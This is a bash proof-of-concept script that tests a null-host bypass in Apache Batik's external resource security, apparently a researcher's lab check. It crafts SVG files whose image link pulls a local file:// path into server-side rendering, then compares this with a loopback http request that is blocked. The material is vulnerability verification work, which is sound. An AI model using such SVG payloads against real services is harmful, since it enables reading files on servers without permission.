#!/usr/bin/env bash
# Live-test F-6/SCV-1: DefaultExternalResourceSecurity null-host bypass -> file:->file: local read allowed on the
# DEFAULT transcoder (server-side), while file:->http is blocked. Differential proves the null-host coalescing bug.
set -uo pipefail
W=/tmp/batik-lab; cd "$W"
CP=$(printf '%s' "$W/batik-1.19/lib/*")
# a valid, distinctive local "secret" image (20x20) to prove the read reached the filesystem
cat > mksecret.py <<'PY'
import struct,zlib
def png(w,h,rgb):
    raw=b''.join(b'\x00'+bytes(rgb)*w for _ in range(h))
    def chunk(t,d): 
        c=struct.pack('>I',len(d))+t+d; return c+struct.pack('>I',zlib.crc32(t+d)&0xffffffff)
    sig=b'\x89PNG\r\n\x1a\n'
    ihdr=chunk(b'IHDR',struct.pack('>IIBBBBB',w,h,8,2,0,0,0))
    idat=chunk(b'IDAT',zlib.compress(raw))
    iend=chunk(b'IEND',b'')
    open('/tmp/batik-lab/secret.png','wb').write(sig+ihdr+idat+iend)
png(20,20,(200,10,10))
print("secret.png written")
PY
python3 mksecret.py

# attacker SVGs
cat > lfi_file.svg <<'SVG'
<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20"><image x="0" y="0" width="20" height="20" xlink:href="file:///tmp/batik-lab/secret.png"/></svg>
SVG
cat > lfi_http.svg <<'SVG'
<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20"><image x="0" y="0" width="20" height="20" xlink:href="http://127.0.0.1:9999/blocked"/></svg>
SVG

echo "=== TEST A: file: doc + file: resource (expect ALLOWED = read, NO SecurityException) ==="
timeout 40 java -cp "$CP:." BatikProbe /tmp/batik-lab/lfi_file.svg file:///tmp/batik-lab/lfi_file.svg false 2>&1 | grep -E "TRANSCODE|Security" | head -3
echo "  (output has red pixels? = file was read & rendered)"
python3 -c "
import struct,zlib,sys
try:
    d=open('/tmp/batik-lab/probe.out.png','rb').read()
    print('  out.png size',len(d),'bytes — nonblank' if len(d)>200 else '  (small/blank)')
except Exception as e: print('  no out.png',e)
"
echo "=== TEST B: file: doc + http resource (expect BLOCKED = SecurityException, :9999 NOT hit) ==="
cat > srv_b.py <<'PY'
import http.server,socketserver,threading,time
HIT={"n":0}
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self): HIT["n"]+=1; print("HTTP_HIT",flush=True); self.send_response(404); self.end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
threading.Thread(target=lambda:socketserver.TCPServer(("127.0.0.1",9999),H).serve_forever(),daemon=True).start()
time.sleep(6); print("HITS=%d"%HIT["n"],flush=True)
PY
python3 srv_b.py > /tmp/batik-lab/f6b.result 2>&1 &
SRV=$!; sleep 1
timeout 40 java -cp "$CP:." BatikProbe /tmp/batik-lab/lfi_http.svg file:///tmp/batik-lab/lfi_http.svg false 2>&1 | grep -E "TRANSCODE|Security" | head -3
sleep 3; echo "  server: $(cat /tmp/batik-lab/f6b.result 2>/dev/null | tail -1)"
kill $SRV 2>/dev/null; echo END
